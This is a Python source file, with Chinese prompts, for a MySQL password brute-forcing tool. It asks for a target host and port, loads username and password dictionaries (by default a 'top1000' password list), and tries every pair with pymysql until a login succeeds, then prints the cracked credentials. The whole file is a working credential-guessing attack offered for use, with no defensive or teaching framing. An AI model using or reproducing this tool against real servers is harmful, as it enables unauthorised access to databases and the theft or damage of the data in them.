import os
import pymysql


def blasting_mysql():
    host = input("输入MySQL主机地址:")
    port = int(input("输入MySQL端口号:"))
    selection = input("输入MySQL用户名[0>系统默认[默认选择] 1>系统附带 2>自定义]:")
    if selection == '1':
        username_list = os.listdir("./UsernameDic")
        array = []
        index = 0
        for item in username_list:
            array.append(item)
            print(index, ":", item)
            index += 1
        index = int(input("选择一个用户名字典:"))
        username_path = array[index % len(array)]
        print(f"用户名选用{username_path}字典")
        username_path = f"./UsernameDic/{username_path}"
    elif selection == '2':
        username_path = input("字典文件路径:")
    else:
        username_path = './UsernameDic/database_username.txt'
    selection = input("选用MySQL密码字典[0>系统默认[默认选择] 1>系统附带 2>自定义]:")
    if selection == '1':
        pass_list = os.listdir("./PasswordDic")
        array = []
        index = 0
        for item in pass_list:
            array.append(item)
            print(index, ":", item)
            index += 1
        index = int(input("选择一个密码字典"))
        password_path = array[index % len(array)]
        password_path = f"./PasswordDic/{password_path}"
    elif selection == '2':
        password_path = input("字典文件路径:")
    else:
        password_path = './PasswordDic/top1000.txt'
    with open(username_path, 'r+') as usernames:
        for username in usernames:
            user = username[:-1]
            with open(password_path, 'r+') as passwords:
                for item in passwords:
                    password = item[:-1]
                    try:
                        pymysql.connect(host=host, port=port, user=user, password=password)
                        print(f"爆破成功MySQL IP地址{host}:{port} 用户名:{user} 密码:{password}")
                        return
                    except ConnectionRefusedError:
                        print("连接目标计算机被拒绝,已退出")
                        return
                    except pymysql.err.OperationalError as ex:
                        print(repr(ex))


def start():
    blasting_mysql()
